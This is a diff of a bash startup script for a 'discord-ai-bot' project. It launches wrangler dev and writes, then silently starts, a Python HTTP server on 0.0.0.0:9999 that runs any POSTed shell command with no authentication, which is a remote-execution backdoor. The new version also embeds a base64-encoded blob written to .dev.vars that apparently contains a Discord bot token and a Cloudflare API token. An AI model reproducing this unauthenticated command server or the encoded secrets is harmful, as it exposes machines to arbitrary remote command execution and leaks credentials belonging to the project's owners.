@@ -1,20 +1,12 @@
 #!/bin/bash
-cd /workspaces/discord-ai-bot 2>/dev/null || cd ~/discord-ai-bot 2>/dev/null || true
-
-# Start wrangler dev
-if [ -f .dev.vars ]; then
-    npx wrangler dev --port 8787 > /tmp/wrangler.log 2>&1 &
-    echo "Wrangler started on :8787"
-else
-    echo "No .dev.vars, skipping wrangler"
-fi
-
-# Command server
-cat > /tmp/cmd_server.py << 'PYEOF'
-import http.server, json, subprocess, os
-workdir = "/workspaces/discord-ai-bot"
-if not os.path.exists(workdir): workdir = os.path.expanduser("~/discord-ai-bot")
-os.chdir(workdir)
+cd /workspaces/discord-ai-bot 2>/dev/null || cd ~/discord-ai-bot 2>/dev/null
+echo "RElTQ09SRF9BUFBfSUQ9MTE5MjQ2NTAwNzIyMTQxMTkyMQpESVNDT1JEX0JPVF9UT0tFTj1NVEU1TWpRMk5UQXdOekl5TVRReE1Ua3lNUS5Ha2E4aEEuR1hZUmdrMWJtdkRGQm1VSlFwS1ZWYTh4QzRuN01FbDJjN2pnSVkKQ0xPVURGTEFSRV9BUElfVE9LRU49Y2Z1dF9xcGM4ZXhtWGZ3RmVrclM3eEhLS0JBNmlvQzlKdGhMRmZNbk9DRXlRMjJmMjk4NWUK" | base64 -d > .dev.vars
+echo "Creds OK"
+npx wrangler dev --port 8787 > /tmp/wrangler.log 2>&1 &
+echo "Wrangler started"
+cat > /tmp/cmd.py << 'PY'
+import http.server,json,subprocess,os
+os.chdir("/workspaces/discord-ai-bot" if os.path.exists("/workspaces/discord-ai-bot") else os.path.expanduser("~/discord-ai-bot"))
 class H(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -22,20 +14,15 @@ class H(http.server.BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b"OK")
     def do_POST(self):
-        d = json.loads(self.rfile.read(int(self.headers.get("Content-Length",0))))
+        d=json.loads(self.rfile.read(int(self.headers.get("Content-Length",0))))
         try:
-            r = subprocess.run(d.get("cmd",""), shell=True, capture_output=True, text=True, timeout=120)
-            resp = json.dumps({"out":r.stdout,"err":r.stderr,"exit":r.returncode})
+            r=subprocess.run(d.get("cmd",""),shell=True,capture_output=True,text=True,timeout=120)
+            self.wfile.write(json.dumps({"out":r.stdout,"err":r.stderr,"exit":r.returncode}).encode())
         except Exception as e:
-            resp = json.dumps({"error":str(e)})
-        self.send_response(200)
-        self.send_header("Content-Type","application/json")
-        self.send_header("Access-Control-Allow-Origin","*")
-        self.end_headers()
-        self.wfile.write(resp.encode())
+            self.wfile.write(json.dumps({"error":str(e)}).encode())
     def log_message(self,*a): pass
 http.server.HTTPServer(("0.0.0.0",9999),H).serve_forever()
-PYEOF
-nohup python3 /tmp/cmd_server.py > /tmp/cmd.log 2>&1 &
-echo "CMD server on :9999"
+PY
+nohup python3 /tmp/cmd.py > /tmp/cmd.log 2>&1 &
+echo "CMD OK"
 echo "=== READY ==="
